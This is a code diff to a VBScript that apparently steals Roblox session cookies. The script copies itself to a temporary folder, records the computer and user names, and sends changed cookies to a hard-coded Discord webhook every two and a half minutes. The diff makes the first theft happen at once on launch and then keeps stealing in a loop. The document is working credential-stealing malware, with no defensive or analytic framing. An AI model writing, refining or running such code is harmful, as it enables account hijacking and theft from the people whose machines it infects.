@@ -9,6 +9,7 @@ WH_ONLINE = "https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0X
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 isFirstRun = True
+lastCookie = ""
 
 On Error Resume Next
 Dim selfPath: selfPath = WScript.ScriptFullName
@@ -26,11 +27,14 @@ If LCase(selfPath) <> LCase(tempPath) Then
 End If
 On Error Goto 0
 
-lastCookie = ""
+' GRAB INSTANTLY ON FIRST RUN
+Call GrabRoblox
+isFirstRun = False
+
+' THEN LOOP FOR REGRABS
 Do
-    Call GrabRoblox
-    isFirstRun = False
     WScript.Sleep 150000 ' 2.5 minutes
+    Call GrabRoblox
 Loop
 
 Sub GrabRoblox()
@@ -45,7 +49,7 @@ Sub GrabRoblox()
     
     If cookie <> lastCookie Then
         lastCookie = cookie
-        Dim t: t = FormatDateTime(Now, 3) ' 3 = hh:mm:ss AM/PM local time
+        Dim t: t = FormatDateTime(Now, 3)
         
         Dim destWH
         If isFirstRun Then
